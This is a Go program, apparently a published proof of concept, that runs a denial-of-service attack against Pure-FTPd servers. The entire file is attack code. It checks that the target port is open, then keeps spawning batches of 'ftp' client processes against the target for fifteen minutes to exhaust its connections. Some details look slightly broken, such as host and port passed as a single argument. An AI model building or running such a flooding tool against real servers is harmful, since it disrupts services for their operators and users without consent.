package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"strconv"
	"sync"
	"time"
)

const banner = `
██████  ██    ██ ██████  ███████     ███████ ████████ ██████  ██████           
██   ██ ██    ██ ██   ██ ██          ██         ██    ██   ██ ██   ██          
██████  ██    ██ ██████  █████       █████      ██    ██████  ██   ██          
██      ██    ██ ██   ██ ██          ██         ██    ██      ██   ██          
██       ██████  ██   ██ ███████     ██         ██    ██      ██████           
                                                                               
                                                                               
██████   ██████  ███████      █████  ████████ ████████  █████   ██████ ██   ██ 
██   ██ ██    ██ ██          ██   ██    ██       ██    ██   ██ ██      ██  ██  
██   ██ ██    ██ ███████     ███████    ██       ██    ███████ ██      █████   
██   ██ ██    ██      ██     ██   ██    ██       ██    ██   ██ ██      ██  ██  
██████   ██████  ███████     ██   ██    ██       ██    ██   ██  ██████ ██   ██

PoC for performing a DoS attack on the Pure-FTPd service
by iTrox

`

func usage() {
	fmt.Printf("Usage: FTPd-DoS <TARGET> <PORT> <MAX_CONNS>\n\n", os.Args[0])
	os.Exit(1)
}

func testConnection(target string, port int) {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", target, port), 10*time.Second)
	if err != nil {
		fmt.Printf("Port %d is not open, please specify a port that is open.\n", port)
		os.Exit(1)
	}
	defer conn.Close()

	fmt.Printf("[!] Connection to %s:%d succeeded.\n", target, port)
}

func attack(target string, port int, id int) {
	cmd := exec.Command("ftp", fmt.Sprintf("%s %d", target, port))
	cmd.Stdout = nil
	cmd.Stderr = nil
	err := cmd.Start()
	if err != nil {
		fmt.Printf("Worker %d failed: %v\n", id, err)
	}
}

func timer(done chan bool, duration time.Duration) {
	time.Sleep(duration)
	done <- true
}

func main() {
	fmt.Print(banner)

	if len(os.Args) < 2 {
		usage()
	}

	target := os.Args[1]
	port := 21
	conns := 50

	if len(os.Args) > 2 {
		parsedPort, err := strconv.Atoi(os.Args[2])
		if err == nil {
			port = parsedPort
		}
	}

	if len(os.Args) > 3 {
		parsedConns, err := strconv.Atoi(os.Args[3])
		if err == nil {
			conns = parsedConns
		}
	}

	fmt.Printf("[!] Testing if %s:%d is open...\n", target, port)
	testConnection(target, port)
	fmt.Printf("[+] Port %d open, starting attack...\n", port)
	time.Sleep(2 * time.Second)
	fmt.Printf("[+] Attack started on %s:%d!\n", target, port)

	var wg sync.WaitGroup
	done := make(chan bool)

	go timer(done, 15*time.Minute)

loop:
	for {
		select {
		case <-done:
			fmt.Println("[+] Time limit reached, stopping attack.")
			exec.Command("pkill", "ftp").Run()
			break loop
		default:
			for i := 0; i < conns; i++ {
				wg.Add(1)
				go func(id int) {
					defer wg.Done()
					attack(target, port, id)
				}(i)
			}
			wg.Wait()
		}
	}
}